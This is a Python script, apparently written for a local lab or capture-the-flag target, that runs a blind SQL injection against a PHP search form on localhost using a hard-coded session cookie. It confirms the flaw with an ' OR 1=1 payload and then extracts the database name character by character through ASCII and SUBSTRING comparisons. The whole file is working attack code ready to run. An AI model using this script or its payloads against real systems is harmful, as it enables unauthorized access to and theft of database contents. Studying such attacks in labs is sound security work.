import requests
import sys

URL = "http://127.0.0.1:8080/search.php"
COOKIES = {"PHPSESSID": "98894d5dd6e8b65b0ad585865055336a"}

print("[*] Testing blind SQLi...", flush=True)

def test(p):
    try:
        r = requests.post(URL, data={"username": p}, cookies=COOKIES, timeout=2)
        return "No results" not in r.text
    except:
        return False

# Quick test
if test("' OR 1=1-- "):
    print("[+] SQLi works", flush=True)

# Get first char of database
def get_char(q, pos):
    for v in range(97, 123):  # a-z
        if test(f"' AND ASCII(SUBSTRING(({q}),{pos},1))={v}-- "):
            return chr(v)
    for v in range(48, 58):  # 0-9
        if test(f"' AND ASCII(SUBSTRING(({q}),{pos},1))={v}-- "):
            return chr(v)
    return None

print("\n[*] Extracting database (first 10 chars):", flush=True)
db = ""
for i in range(1, 11):
    c = get_char("SELECT database()", i)
    if c:
        db += c
        print(f"  Position {i}: {c} -> {db}", flush=True)
    else:
        break

print(f"\n[+] Database: {db}", flush=True)

